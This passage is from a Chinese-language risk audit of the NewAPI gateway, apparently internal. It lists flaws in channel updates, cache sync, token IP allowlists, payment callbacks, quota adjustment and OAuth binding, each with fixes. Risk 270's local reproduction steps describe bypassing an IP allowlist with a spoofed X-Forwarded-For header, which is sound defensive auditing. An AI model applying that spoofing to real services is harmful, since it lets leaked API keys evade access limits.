  - `model/channel.go:576-586`：`UpdateResponseTime` 和 `UpdateBalance` 使用 `Select("...").Updates(...)`，说明项目在其它位置已用显式字段解决零值更新问题；`Channel.Update` 没有采用同样模式。
  - `model/channel.go:349-353`：`SaveWithoutKey` 使用 `Save` 且显式 `Omit("key")`，和 `Updates` 的零值跳过语义不同；自动状态路径不代表普通编辑路径安全。
  - `docs/newapi-ops-risk-audit.md:8106-8135`：风险 262 已覆盖多 key replace 继承旧状态图；本轮新增聚焦普通渠道字段清空无效。
- 可能后果：运营想立刻撤销一个泄露的上游 key，于是在渠道编辑里把 key 清空并保存，接口返回成功、前端也看不到 key，但 DB 中旧 key 仍存在并被缓存刷新后继续用于真实请求。运营想清空模型或分组以停止售卖某渠道能力，旧 `models/group` 可能保留并重建 abilities，用户仍能被路由到该渠道。旧 `other_info.status_reason`、旧 region/other settings 或旧运行时字段清不掉，会让后台继续显示过期现场，或让请求继续使用旧区域/旧配置。该问题不直接修改充值余额，但会削弱事故处置和凭证撤销能力，是高影响运营风险。
- 复现思路：本地创建普通渠道并保存 key、models、group、other/other_info；调用 `PUT /api/channel/` 提交同一 channel id，但把 `key=""`、`models=""` 或 `group=""`；观察接口返回成功且响应隐藏 key。随后直接查 DB 或调用完整 key 查看/路由测试，确认旧 key/模型/分组是否仍存在并继续生效。多 key 场景可尝试把 key 清空或缩短为零条，观察旧 key 是否保留。
- 修复建议：渠道更新必须使用字段级 patch 语义。后端应根据请求体 presence 生成 `map[string]any` 或使用 `Select` 明确保存允许更新的字段，空字符串/null 必须按语义落库；高危字段如 `key/models/group/base_url/other/settings/overrides` 清空时要求二次确认和审计。保存后对关键字段做 read-after-write diff，若提交了清空而 DB 未清空应返回错误。`UpdateAbilities` 应基于实际保存后的字段并在清空模型/分组时禁用或删除 abilities。前端保存成功文案应展示字段 diff，尤其是 key 是否 rotate/clear、models/group 是否清空。
- 优先级：P1
- 当前状态：已确认普通渠道更新使用 struct `Updates`，非指针零值字段清空可能被跳过；尚未修复。

### 风险 264：渠道编辑只刷新当前实例的 channel/proxy 缓存，多实例会在同步窗口内继续使用旧 key/override/模型路由

- 标题：`UpdateChannel` 保存成功后只在处理该请求的进程里调用 `model.InitChannelCache()` 和 `service.ResetProxyClientCache()`。在 `MEMORY_CACHE_ENABLED=true` 或 Redis 自动开启内存缓存的多实例部署中，其它实例不会收到广播，只能等各自的 `SyncChannelCache(SYNC_FREQUENCY)` 周期从 DB 重建 channel cache。事故中刚撤销的 key、刚清掉的 override、刚禁用/迁移的模型分组和刚变更的 proxy，仍可能被其它实例继续用于新请求直到同步窗口结束。
- 影响范围：渠道 key 泄露应急撤销、header/param override 清理、base_url/proxy 切换、models/group/status 变更、abilities 路由、上游成本控制、渠道故障切流、多实例负载均衡和事故响应可信度。
- 触发条件：部署多个 API 实例且启用 Redis 或 `MEMORY_CACHE_ENABLED=true`；Root/Admin 在某一实例保存渠道编辑、删除/禁用渠道、更新 key/override/proxy/models/group/status；随后用户请求被负载均衡到尚未执行下一次 channel sync 的其它实例。`SYNC_FREQUENCY` 默认 60 秒，也可能被配置成更长。
- 涉及文件/函数：
  - `controller/channel.go:977-983`：`UpdateChannel` 调用 `channel.Update()` 后只在当前进程执行 `model.InitChannelCache()` 和 `service.ResetProxyClientCache()`，没有广播、版本号或跨实例 ack。
  - `model/channel_cache.go:22-87`：`InitChannelCache()` 仅在 `common.MemoryCacheEnabled` 开启时，从 DB 重建当前进程的 `group2model2channels` 与 `channelsIDM`，本质是进程内 map 替换。
  - `model/channel_cache.go:89-95`：`SyncChannelCache(frequency)` 是无限 sleep 后本进程周期性拉 DB，没有事件驱动通知。
  - `main.go:76-97`：Redis 开启时会强制 `MemoryCacheEnabled=true`，启动时先初始化本进程 channel cache，再 `go model.SyncChannelCache(common.SyncFrequency)`。
  - `common/init.go:83-102` 与 `common/redis.go:30-32`：`MEMORY_CACHE_ENABLED` 来自环境变量，`SYNC_FREQUENCY` 默认 60 秒；Redis 模式未设置时也会使用 60 秒默认值。
  - `model/channel_cache.go:97-205`：真实选渠和 `CacheGetChannel` 在内存缓存开启时直接读 `group2model2channels/channelsIDM`，尚未同步的实例会继续按旧 channel 对象路由。
  - `service/http_client.go:65-83` 与 `service/http_client.go:85-169`：proxy HTTP client 缓存在当前进程的 `proxyClients` map 中，`ResetProxyClientCache()` 也只关闭并清空本进程缓存。
  - `docs/newapi-ops-risk-audit.md:1217-1232`：风险 65 覆盖的是全局 options/支付/价格配置多实例轮询漂移；`docs/newapi-ops-risk-audit.md:7711-7733`：风险 251 覆盖的是 channel affinity 本地 cache 清理/统计。本轮新增聚焦 channel 路由凭证和 proxy client 缓存。
- 可能后果：运营发现上游 key 泄露后在后台更新或清空渠道，命中实例 A 的请求已使用新缓存，但命中实例 B/C 的新请求仍会用旧 `channelsIDM` 中的旧 key、旧 header override 或旧 proxy 对上游发起调用，造成凭证继续暴露、成本继续外流或错误 header 继续透传。Root 禁用坏渠道或移除某模型后，不同实例在同步窗口内会给用户返回不一致结果：一部分已经切走，一部分仍打到故障渠道。事故复盘时，后台保存时间和真实流量停止时间不一致，容易误判为用户缓存、上游延迟或渠道自动恢复。
- 复现思路：本地启动两个进程，共用同一 DB，并开启 `MEMORY_CACHE_ENABLED=true`，把 `SYNC_FREQUENCY` 设为较长值例如 300。先让两个进程完成初始 channel cache；随后只通过实例 A 更新渠道 key、models/group 或 status。立刻从实例 B 发起 relay 或调用依赖 `CacheGetChannel` 的测试路径，观察是否仍使用旧 channel 对象直到实例 B 周期同步。proxy 场景可把渠道 proxy 从旧 URL 改成新 URL，检查实例 B 是否仍按旧缓存选择旧 proxy client。
- 修复建议：渠道变更应有跨实例失效机制。最小方案是在 Redis 中发布 channel cache invalidation/version 事件，每个实例订阅后立即执行 `InitChannelCache()` 并清理受影响的 proxy client；后台响应应能显示“已通知 N 个实例/仍有 N 个实例未确认”。更稳妥的做法是给 channel cache 增加版本号和变更时间，新请求选渠前若本地版本落后于 Redis/DB 全局版本则同步或拒绝使用旧缓存。高危动作如禁用渠道、撤销 key、清空 override 应提供 emergency mode：同步所有实例成功后才返回成功，或临时绕过内存缓存直接查 DB。proxy client cache 可按 channel id + proxy version 管理，避免仅按 URL 的本地缓存隐藏切换效果。
- 优先级：P1
- 当前状态：已确认渠道编辑后的 cache/proxy 刷新只作用当前实例，其他实例依赖周期同步；尚未修复。

### 风险 270：token IP 白名单直接信任 Gin `ClientIP()`，未配置可信代理时可被 `X-Forwarded-For` 伪造绕过

- 标题：token 的 IP 白名单在 `TokenAuth` 中直接读取 `c.ClientIP()`，但主程序只 `gin.New()`，没有显式 `SetTrustedProxies` 或关闭转发头信任。Gin 1.9.1 默认 `ForwardedByClientIP=true`、默认读取 `X-Forwarded-For/X-Real-IP`，且 TrustedProxies 默认信任所有代理。若实例直接暴露到公网，或反向代理没有清洗客户端传入的转发头，攻击者可以伪造白名单 IP 通过 token IP 限制。
- 影响范围：API token IP 白名单、所有正式 relay 路由、用户/企业客户子 key 的来源限制、泄露 token 后的应急控制、支付/充值无直接入账影响但会放大余额消耗和渠道成本风险。
- 触发条件：用户为 token 配置 `allow_ips`；NewAPI 实例未显式配置 Gin trusted proxies；部署在直连公网、或 nginx/CDN/负载均衡未覆盖并清洗 `X-Forwarded-For`/`X-Real-IP`；攻击者持有或猜到 API key，并在请求头里放入白名单 IP。
- 涉及文件/函数：
  - `main.go:162`：HTTP server 使用 `gin.New()`，当前仓库没有发现后续 `SetTrustedProxies` 配置。
  - `middleware/auth.go:351-366`：`TokenAuth` 获取 `allowIps := token.GetIpLimits()` 后直接用 `clientIp := c.ClientIP()` 与 allowlist 比对。
  - `model/token.go:59-77`：`GetIpLimits` 从 `AllowIps` 解析出字符串列表，不保存“是否可信代理配置已启用”或来源策略。
  - `common/ip.go:33-48`：`IsIpInCIDRList` 支持 CIDR 和单 IP 匹配，本身不会判断该 IP 是否来自可信网络边界。
  - `github.com/gin-gonic/gin@v1.9.1/gin.go:180-202`：`gin.New()` 默认 `ForwardedByClientIP=true`，`RemoteIPHeaders=["X-Forwarded-For","X-Real-IP"]`。
  - `github.com/gin-gonic/gin@v1.9.1/gin.go:419-428`：Gin 注释说明 TrustedProxies 默认启用且默认信任所有代理；可用 `SetTrustedProxies(nil)` 禁用。
  - `github.com/gin-gonic/gin@v1.9.1/context.go:768-805`：`ClientIP()` 在远端 IP 被视为 trusted 时会解析 RemoteIPHeaders 并返回 header 中的 IP。
  - `web/default/src/features/keys/components/api-keys-mutate-drawer.tsx:548-570` 与 `web/classic/src/components/table/tokens/modals/EditTokenModal.jsx:631-637`：前端文案提示“IP may be spoofed/请勿过度信任”，但后端没有强制可信代理配置。
- 可能后果：用户以为某 token 只允许公司出口 IP 或服务器 IP 调用，实际泄露者可在请求中伪造 `X-Forwarded-For: 公司IP` 通过校验，继续消耗用户余额、订阅额度或平台渠道成本。应急时运营可能建议用户先加 IP 白名单限制泄露 key，但在代理配置不安全时这个措施无效。由于日志同样可能记录 `c.ClientIP()`，事故复盘会看到伪造的“白名单 IP”，误导客服和风控判断。
- 复现思路：本地启动未设置 `SetTrustedProxies` 的服务，创建 token 并设置 `allow_ips` 为 `1.2.3.4`；从非该 IP 的客户端请求 relay，同时加 header `X-Forwarded-For: 1.2.3.4` 或 `X-Real-IP: 1.2.3.4`，观察 `TokenAuth` 是否把 `ClientIP()` 解析为白名单 IP 并放行。仅使用本地测试 token，不对生产服务或真实客户 key 做尝试。
- 修复建议：启动时必须显式配置可信代理。直连部署应 `server.SetTrustedProxies(nil)`；反向代理部署应只信任实际代理/CDN 的内网 IP/CIDR，并在 nginx/CDN 层覆盖而不是透传用户提供的 `X-Forwarded-For`。后台增加“可信代理/IP 白名单安全状态”自检：如果启用了 token IP 白名单但 trusted proxies 仍为默认全信任，启动日志和管理页应高危告警。TokenAuth 可封装 `GetTrustedClientIP`，返回 IP、来源 header、trusted proxy 状态，并在日志中标记 `client_ip_source=remote_addr|xff|x-real-ip`。为此增加集成测试，覆盖 `SetTrustedProxies(nil)`、指定代理和默认全信任三种场景。
- 优先级：P1
- 当前状态：已确认仓库未显式配置 Gin trusted proxies，token IP allowlist 依赖 `ClientIP()`；尚未修复。

### 风险 272：自动普通充值回调不统一校验目标用户存在，已删除用户的 pending 订单可被标 success 但无人到账

- 标题：Stripe/Waffo/Waffo Pancake 等普通充值完成路径先把 `top_ups` 标记 success，再对 `users.id = topUp.UserId` 加额度且不检查 `RowsAffected`；用户被硬删除后支付回调仍可能产生 paid/no-credit 孤儿成功订单。
- 影响范围：Stripe、Waffo、Waffo Pancake、部分 Creem 空邮箱路径、Epay 普通充值、已硬删除用户的 pending `top_ups`、用户 quota、`topup_money`、邀请充值返利、充值业务日志、客服对账和收入统计。
- 触发条件：用户创建普通充值 pending 订单后被管理员硬删除；随后第三方支付成功 webhook 到达。对 Stripe/Waffo/Waffo Pancake 来说，模型层事务没有先锁定并确认目标用户存在；对 Epay 来说，成功回调先把订单标 success，再调用不检查影响行数的 `IncreaseUserQuota`。
- 涉及文件/函数：
  - `model/user.go:83-110`：`User` 有 `DeletedAt` 软删除字段；普通 `Model(&User{})` 更新默认只匹配未删除用户，硬删除后更是无行可更新。
  - `model/user.go:447-452`：后台硬删除使用 `DB.Unscoped().Delete(&User{}, "id = ?", id)`，会直接移除用户主记录。
  - `model/topup.go:191-253`：Stripe 普通充值在事务内保存 `topUp.Status=success`，再执行 `tx.Model(&User{}).Where("id = ?", topUp.UserId).Updates(...)`；只检查 `Error`，不检查 `RowsAffected`。
  - `model/topup.go:608-680` 与 `model/topup.go:682-752`：Waffo 和 Waffo Pancake 也在 pending 成功分支中保存 success 后更新用户 quota、刷新 `topup_money` 和发返利，用户更新同样没有 `RowsAffected == 1` 断言。
  - `model/topup.go:519-606`：Creem 若回调客户邮箱为空，会直接走 quota 更新字段；该更新也只检查 `Error`，没有统一的 active-user guard。若邮箱非空，读取用户失败会回滚，说明当前行为依赖 provider payload 是否带邮箱而非显式用户校验。
  - `model/user.go:1009-1028` 与 `controller/topup.go:373-423`：Epay 成功回调先把订单保存为 success，再调用 `IncreaseUserQuota`；底层 `increaseUserQuota` 同样不检查影响行数，重复 success 只刷新累计充值。
  - `model/user.go:267-281`：`refreshUserTopUpMoneyWithTx/RefreshUserTopUpMoney` 只执行 `UPDATE users ... WHERE id = ?`，目标用户不存在时通常不会报错，也不会阻止订单完成。
  - `model/topup.go:69-130`：邀请充值返利在被邀请用户不存在时返回 nil，不会让事务因目标用户缺失而失败。
  - `docs/newapi-ops-risk-audit.md:6153-6169`：风险 211 已覆盖管理员手动补单对孤儿 pending 订单的同类后果，但触发入口是后台 `/api/user/topup/complete`。
  - `docs/newapi-ops-risk-audit.md:6187-6203`：风险 212 已覆盖订阅订单完成/后台绑定给不存在用户发放订阅权益，本轮新增聚焦普通充值 webhook 自动完成。
- 可能后果：真实支付成功后，本地订单显示 success，收入统计会把该 `top_ups.money` 计入成功收入；但用户主记录已不存在，额度没有到账，`topup_money` 也没有可刷新目标，返利不会发放或无法追踪。客服看到的是“第三方已付、本地已成功、用户不存在”的孤儿成功单，后续既不能再走 pending 补单，也难以判断应退款、恢复用户、人工加额还是作废收入。
- 复现思路：本地创建用户并生成 Stripe/Waffo/Waffo Pancake 普通充值 pending 订单；调用后台硬删除该用户；随后直接调用对应模型完成函数或本地模拟签名通过的 webhook。观察 `top_ups.status='success'` 和 `complete_time` 已更新，但 `users` 表无对应记录，用户 quota/topup_money 未变化，返利日志缺失。该复现只使用本地数据库和本地模拟，不调用真实支付渠道。
- 修复建议：所有普通充值完成入口应在事务开始时锁定并确认目标用户存在且未删除，或调用统一的 `EnsureActiveUserForAssetTx`；用户 quota 更新必须使用条件更新并要求 `RowsAffected == 1`，否则回滚订单状态并转入 `manual_review/user_missing` 或 `credit_failed`。`topup_money` 刷新也应检查目标用户存在性；支付事件流水应记录“provider 已付款但本地用户缺失”的待处理状态，不能直接标 success。管理员硬删除有 pending 支付订单的用户时，应阻止删除或先提示取消/退款/转人工对账。
- 优先级：P1。
- 当前状态：未修复。

### 风险 273：手工调额可对已软删除、已硬删除或不存在用户返回成功，实际 quota 未必落到活跃账号

- 标题：`ManageUser` 调额入口用 `Unscoped()` 读取目标用户并忽略查询错误，后续 add/subtract/override 不校验 `DeletedAt`、用户状态或数据库 `RowsAffected`。管理员可以对软删除、硬删除或不存在的用户 ID 发起调额，接口可能返回成功并写入管理日志，但活跃账号的 quota 未必发生变化。
- 影响范围：后台用户管理、管理员手工加减额度、异常充值 paid/no-credit 补偿、退款争议扣回、软删除/硬删除用户、Redis 用户 quota cache、客服工单和资产审计。
- 触发条件：
  - 管理员列表、历史链接、脚本或抓包请求向 `/api/user/manage` 提交 `action=add_quota`，目标 `id` 是已软删除、已硬删除或根本不存在的用户。
  - 目标用户已被 `DB.Delete(user)` 软删除，但后台查询和管理入口仍通过 `Unscoped()` 可以读到该行。
  - 目标用户已被 `DB.Unscoped().Delete(&User{}, "id = ?", id)` 硬删除，或请求直接使用不存在的 ID。
  - Redis 开启时，add/subtract 会先异步执行 `HIncrBy(user:<id>, "Quota", delta)`，即使数据库没有命中活跃用户，也可能生成或污染一个仅包含 quota 字段的缓存 hash。
- 涉及文件/函数：
  - `controller/user.go:887-900`：`ManageUser` 构造 `model.User{Id: req.Id}` 后调用 `model.DB.Unscoped().Where(&user).First(&user)`，没有检查 `First` 返回的 error；如果没有查到行，后续只用 `user.Id == 0` 判断不存在，无法可靠拦截请求里携带的缺失 ID。
  - `controller/user.go:291-292`：`canManageTargetRole` 只比较角色大小；缺失用户的零值 Role 可能让普通管理员通过目标角色校验。
  - `controller/user.go:955-1002`：add/subtract/override 三种调额路径均没有拒绝 `DeletedAt.Valid`、`Status != enabled` 或不存在用户，也没有要求数据库更新命中一行。
  - `model/user.go:330-337`、`model/user.go:351-370`：后台用户列表和搜索使用 `Unscoped()`，软删除用户可以进入后台数据视野，增加误调额概率。
  - `model/user.go:698-707`：普通删除走 `DB.Delete(user)` 软删除并清理用户缓存。
  - `model/user.go:447-452`：硬删除走 `DB.Unscoped().Delete(&User{}, "id = ?", id)`。
  - `model/user.go:1009-1032`：`IncreaseUserQuota` 先异步改 Redis，再调用 `increaseUserQuota`；数据库更新只检查 `.Error`，不检查 `RowsAffected`。
  - `model/user_cache.go:135-140`：`cacheIncrUserQuota` 直接对 `user:<id>` 的 `Quota` 字段执行 `HIncrBy`，不存在用户 ID 也可能被写出缓存痕迹。
  - `web/default/src/features/users/components/users-mutate-drawer.tsx:381-388`、`web/default/src/features/users/components/users-mutate-drawer.tsx:463-472`：default 编辑抽屉中“Adjust Quota”只传 `userId/currentQuota` 给 `UserQuotaDialog`，没有把删除状态、禁用状态或二次确认上下文交给调额弹窗。
  - `web/default/src/features/users/components/data-table-row-actions.tsx:134-136`：default 行动作菜单对 deleted 用户返回 null，这是正向限制；但调额按钮在编辑抽屉内，最终仍必须以后端为准。
- 可能后果：
  - 运营看到“调额成功”，管理日志也记录了某个用户 ID 的额度变化，但数据库没有任何活跃用户被加额或扣额，paid/no-credit 补偿实际上没有完成。
  - 退款扣回或人工覆盖可能被记录为已执行，实际没有命中用户；客服、财务和风控会基于错误的操作结果继续处理争议。
  - 风险 272 的“充值订单 success 但用户缺失/已删除”如果靠手工调额兜底，可能再次落到同一个已删除或不存在 ID 上，形成二次 false-success。
  - Redis 开启时，不存在用户 ID 的 `user:<id>` 可能被 `HIncrBy` 写出部分缓存，后续排查时出现“缓存里像是有额度、数据库没有用户”的诊断噪音。
  - 对软删除用户的调额可能在未来恢复账号时暴露出历史人工操作，且没有结构化 ledger 说明来源和处理原因。
- 复现思路：
  - 本地创建普通用户并软删除，然后以管理员身份对该用户 ID 调用 `/api/user/manage`，payload 使用 `{"id": <deleted_id>, "action": "add_quota", "mode": "add", "value": 100}`，观察接口成功、管理日志写入和活跃用户查询结果。
  - 对一个已硬删除或不存在的 ID 重复上述请求，观察接口是否仍可能成功返回，数据库 `users` 更新影响行数为 0。
  - Redis 开启时，在不存在 ID 上执行 add/subtract 后检查 `user:<id>` hash 是否出现 `Quota` 字段。
  - 对 override 路径用不存在 ID 调用，验证 `Update("quota", req.Value)` 只看 `.Error` 而没有对 0 行命中报错。
- 修复建议：
  - `ManageUser` 必须检查 `First` 的 error；`ErrRecordNotFound` 直接返回 `user_not_exists`，其他数据库错误直接返回失败。
  - 资产类调额默认不要使用 `Unscoped()`；如果后台需要查看软删除用户，也应把查看和资产变更拆开，资产变更显式拒绝 `DeletedAt.Valid`。
  - 对 `Status != enabled` 的用户建立明确策略：默认拒绝调额，确需处理时进入 `manual_review/user_disabled` 流程，并要求 reason、工单号和独立二次确认。
  - 所有 quota 更新都应在事务里执行，并要求 `RowsAffected == 1`；0 行命中必须返回失败，不允许记录“成功调额”日志。
  - Redis quota 变更应在数据库事务成功后执行，或使用事务后失效缓存重建；不要先对未知用户 ID 执行 `HIncrBy`。
  - 手工调额、异常充值恢复和退款扣回应写入统一资产 ledger，记录管理员、原始 `trade_no`、provider event id、原因、旧值、新值、命中用户状态和数据库更新行数。
  - 前端调额弹窗应显示用户状态、删除状态、用户 ID、旧额度、新额度和差额；对 deleted/disabled 用户隐藏普通调额按钮，并把异常处置导向专门的人工复核流程。
- 优先级：P1。
- 当前状态：未修复。

### 风险 275：自定义 OAuth 绑定可写入已删除或不存在的 session 用户，外部身份被孤儿 `user_id` 卡死

- 标题：多个绑定入口依赖 `FillUserById` 确认当前 session 用户，但 `FillUserById` 忽略 `DB.First` 的错误并始终返回 nil；内置 OAuth/邮箱/Telegram 绑定后续走 `User.Update`，主要表现为 false-success 或缓存零值污染，而自定义 OAuth 绑定走独立 `user_oauth_bindings` 表，会直接为已删除、已硬删除或不存在的 session `user_id` 创建绑定记录。
- 影响范围：自定义 OAuth 登录/绑定、硬删除用户、软删除用户、dashboard 旧 session、`user_oauth_bindings` 唯一约束、OAuth 提供商删除、用户账号恢复、客服换绑和外部身份归属。
- 触发条件：
  - 用户在 dashboard cookie session 仍有效时被后台软删除或硬删除；session 层状态失效问题已由风险 67 覆盖，但这里的后果落在 OAuth 绑定表。
  - 用户访问自定义 OAuth bind 回调；`handleOAuthBind` 从 session 取 `id` 后调用 `FillUserById`。
  - `FillUserById` 查不到活跃用户也返回 nil，保留 `user.Id` 为 session 中的旧 ID。
  - Provider 是自定义 OAuth，即 `GenericOAuthProvider`，绑定分支调用 `UpdateUserOAuthBinding(user.Id, providerId, providerUserID)`。
- 涉及文件/函数：
  - `model/user.go:743-750`：`FillUserById` 调用 `DB.Where(User{Id: user.Id}).First(user)` 但不接收、不检查 error，函数最后固定返回 nil。
  - `controller/oauth.go:176-183`：`handleOAuthBind` 从 session 读取 `id`，构造 `model.User{Id: id.(int)}` 后调用 `FillUserById`；由于底层错误被吞掉，已删除/不存在用户不会在这里失败。
  - `controller/oauth.go:188-194`：自定义 OAuth provider 分支调用 `model.UpdateUserOAuthBinding(user.Id, genericProvider.GetProviderId(), oauthUser.ProviderUserID)`，不再确认 active user 存在。
  - `model/user_oauth_binding.go:108-129`：`UpdateUserOAuthBinding` 若当前 user/provider 无绑定，会调用 `CreateUserOAuthBinding` 创建新记录；只校验 `userId != 0`，不校验 `users` 表仍有活跃用户。
  - `model/user_oauth_binding.go:63-81`：`CreateUserOAuthBinding` 检查 provider user id 是否已被占用，然后直接 `DB.Create(binding)`。
  - `model/user_oauth_binding.go:41-51`：后续自定义 OAuth 登录通过 binding 找到 `binding.UserId` 后再 `DB.First(&user, binding.UserId)`；如果 user 已删除/不存在，登录失败，但外部身份已经被 binding 表占用。
  - `controller/custom_oauth.go:418-424`、`model/user_oauth_binding.go:142-145`：删除自定义 OAuth provider 前会统计绑定数量；孤儿 binding 也会阻止 provider 删除。
  - `controller/user.go:797-815` 与 `model/user.go:447-452`：default 硬删除只删 users 主记录，不级联 `user_oauth_bindings`，这是孤儿身份记录形成的前置条件之一。
  - `controller/wechat.go:170-179`、`controller/discord.go:209-216`、`controller/oidc.go:211-218`、`controller/github.go:198-205`、`controller/telegram.go:49-64`、`controller/user.go:1047-1063`：内置绑定/邮箱绑定也受 `FillUserById` 或 `User.Update` 0 行更新影响，但它们写 users 主表，主要是 false-success，不会像自定义 OAuth 一样新增独立孤儿绑定行。
- 可能后果：
  - 用户的外部 OAuth 账号被绑定到已删除或不存在的 `user_id`，后续用该 OAuth 登录会因为找不到用户而失败，但再次绑定到真实新账号又会被“该 OAuth 账户已被绑定”拦截。
  - 运营删除用户后，外部身份仍占用在孤儿 binding 上；客服换绑需要手工查表清理，否则用户无法完成账号恢复或重新注册绑定。
  - 自定义 OAuth provider 删除会被孤儿绑定数量阻止，后台看到“还有用户绑定”但 users 表找不到对应活跃用户。
  - 如果后续按相同 ID 恢复、导入或复用用户，孤儿 binding 可能把外部身份错误归属给新/恢复账号，造成账号归属争议。
  - 内置 OAuth/邮箱/Telegram 路径虽然不新增绑定表孤儿行，但会给用户“绑定成功”的假象，且可能通过 `User.Update` 写入零值 user cache；这部分与风险 19/274 共用修复。
- 复现思路：
  - 本地启用一个自定义 OAuth provider，用户登录后保持 dashboard session。
  - 后台硬删除或软删除该用户，保留浏览器 session。
  - 使用该 session 发起自定义 OAuth 绑定回调，观察 `user_oauth_bindings` 是否出现 `user_id=<deleted_id>` 的新记录。
  - 尝试用该外部 OAuth 登录，观察 `GetUserByOAuthBinding` 找到 binding 后因 users 表无活跃记录失败。
  - 尝试把同一外部 OAuth 账号绑定到另一个活跃用户，观察唯一性/已绑定检查是否拒绝。仅在本地测试 provider 和测试账号中操作，不接入真实生产 OAuth 账号。
- 修复建议：
  - `FillUserById` 必须返回 `DB.First` 的真实 error；所有调用点应把 `ErrRecordNotFound` 视为未登录/用户已注销。
  - 自定义 OAuth 绑定前必须显式校验 active user 存在、未删除、状态 enabled，并最好在同一事务内创建 binding。
  - `CreateUserOAuthBinding` 和 `UpdateUserOAuthBinding` 应校验 `users.id` 存在且 `deleted_at IS NULL`；数据库层可增加外键或在删除用户时统一归档/删除/失效 binding。
  - 删除用户时应处理内置 OAuth 字段和 `user_oauth_bindings`：保留审计快照，但释放外部身份或进入可恢复的解绑状态。
  - 自定义 OAuth provider 删除前的 binding count 应区分 active user binding 与 orphan binding，并提供带审计的孤儿绑定清理入口。
  - 内置绑定、邮箱绑定和 Telegram 绑定应统一用 `GetUserById`/active-user helper，`User.Update` 必须检查 `RowsAffected == 1`，避免 false-success。
- 优先级：P1。
- 当前状态：未修复。

### 风险 276：软删除和硬删除对外部身份/安全因子的释放策略不一致，账号恢复与重绑可能被长期卡住

- 标题：用户删除只操作 `users` 主记录和少量 Redis cache，没有统一处理内置 OAuth 字段、自定义 OAuth binding、Passkey、2FA/备用码等身份与安全因子。软删除时，多数“是否已绑定”检查使用 `Unscoped()`，会继续把已删除用户的外部身份判定为占用；硬删除时，内置字段随 users 行消失，但 `user_oauth_bindings`、`passkey_credentials`、`two_fas`、`twofa_backup_codes` 等独立表没有统一清理、归档或释放，形成删除方式不同导致的重绑/恢复/审计语义漂移。
- 影响范围：用户自助删除、管理员软删除、管理员硬删除、GitHub/Discord/OIDC/WeChat/Telegram/LinuxDO 绑定、邮箱、AccessToken、自定义 OAuth、Passkey、2FA、账号恢复、重新注册、外部身份换绑、管理员删除用户和客服排障。
- 触发条件：
  - 用户绑定过任一内置外部身份、邮箱、自定义 OAuth、Passkey 或 2FA。
  - 用户通过 `DeleteUserById`/`user.Delete()` 被软删除，或通过 `HardDeleteUserById` 被硬删除。
  - 同一个外部身份后续尝试绑定到新账号、恢复原账号、删除 provider、重新注册 passkey 或进行 2FA/Passkey 登录。
- 涉及文件/函数：
  - `model/user.go:439-452`：`DeleteUserById` 只调用 `user.Delete()` 软删除；`HardDeleteUserById` 只执行 `DB.Unscoped().Delete(&User{}, "id = ?", id)`。
  - `model/user.go:698-707`：`User.Delete` 只软删除 users 行并清理 user cache，没有处理 token、OAuth、Passkey、2FA 或外部身份释放。
  - `controller/user.go:791-815`：管理员硬删除入口只删除 users 主记录；此前风险 142/143 已覆盖缓存和孤儿资产，但身份释放策略仍没有统一。
  - `model/user.go:92-111`：GitHub/Discord/OIDC/WeChat/Telegram/LinuxDO、email、access token 等内置身份字段都存放在 users 主表。
  - `model/user.go:810-833` 与 `model/user.go:1176-1180`：`IsEmailAlreadyTaken`、`IsWeChatIdAlreadyTaken`、`IsGitHubIdAlreadyTaken`、`IsDiscordIdAlreadyTaken`、`IsTelegramIdAlreadyTaken`、`IsLinuxDOIdAlreadyTaken` 使用 `Unscoped()`；软删除用户仍会占用这些身份。`IsOidcIdAlreadyTaken` 没有 `Unscoped()`，与其他身份语义不一致。
  - `model/user.go:759-807`、`model/user.go:1182-1187`：多个 `FillUserBy*Id` 读取活跃 users 行；其中 GitHub/Discord/OIDC/WeChat 会吞掉 `First` error，Telegram/LinuxDO 返回 error，绑定/登录错误语义不一致。
  - `model/user_oauth_binding.go:23-51`、`model/user_oauth_binding.go:108-139`：自定义 OAuth binding 独立存表；用户硬删除不会自动删除或归档 binding。
  - `model/passkey.go:23-42`、`model/passkey.go:180-210`：Passkey 凭证独立存表，`credential_id` 唯一；删除用户不会调用 `DeletePasskeyByUserID`。
  - `model/twofa.go:13-34`、`model/twofa.go:97-113`、`model/twofa.go:212-225`：2FA 和备用码独立存表；删除用户不会调用 `DisableTwoFA` 或归档 2FA。
  - `controller/passkey.go:273-325`：Passkey 登录通过凭证找到 `credential.UserID` 后调用 `FillUserById`；已删除用户会失败或因状态零值被拒绝，但凭证记录仍占用 credential id。
  - `controller/twofa.go:397-488`：2FA 登录会重新 `GetUserById`，已删除用户会失败；但 2FA 记录和备用码仍可能保留为孤儿审计/清理对象。
- 可能后果：
  - 软删除用户后，GitHub/Discord/WeChat/Telegram/LinuxDO/email 仍因 `Unscoped` 判重而无法被新账号绑定；客服看到用户已删除，却无法解释外部身份为什么仍被占用。
  - OIDC 与其他内置身份判重策略不同，软删除 OIDC 可能被视为未占用，导致删除后重绑/复用行为和 GitHub/Discord 等不一致。
  - 硬删除用户后，内置身份字段随 users 行消失，外部身份看似释放；但自定义 OAuth binding、passkey credential、2FA/backup code 仍保留孤儿记录，provider 删除、passkey 重注册或审计查询可能被这些孤儿数据卡住。
  - Passkey 的 `credential_id` 唯一索引可能阻止同一安全密钥重新注册到新账号；自定义 OAuth 的 provider_user_id 唯一约束会阻止同一外部账号重绑。
  - 删除用户后是“保留身份防止冒用”还是“释放身份允许重绑”没有状态机和审计记录，客服只能手工改库，容易造成外部账号归属争议。
  - 与风险 275 叠加时，旧 session 还可能在删除后新增孤儿自定义 OAuth binding，使清理边界更复杂。
- 复现思路：
  - 本地创建用户并绑定 GitHub/Discord/Telegram/LinuxDO/email 中任一身份，软删除该用户后，用另一个用户尝试绑定同一身份，观察 `Is*AlreadyTaken` 是否因 `Unscoped` 返回已占用。
  - 对 OIDC 重复同类测试，观察其 scoped 判重是否与其他身份不一致。
  - 创建自定义 OAuth binding、Passkey 和 2FA 后硬删除用户，查询 `user_oauth_bindings`、`passkey_credentials`、`two_fas`、`twofa_backup_codes` 是否仍保留旧 `user_id`。
  - 尝试删除自定义 OAuth provider 或用同一外部账号/同一 passkey credential 重绑到新用户，观察是否被孤儿记录阻断。仅使用本地测试账号和测试凭证，不操作生产身份。
- 修复建议：
  - 引入统一 `DeleteUserService`，删除前生成身份/资产影响清单，明确每类关联数据是保留、释放、禁用、归档还是转人工。
  - 软删除用户时，把外部身份状态改为 `released/preserved/deleted_user` 这类显式状态，而不是混用 `Unscoped` 判重；后台应能显示“被已删除用户占用”的身份并支持有审计的释放。
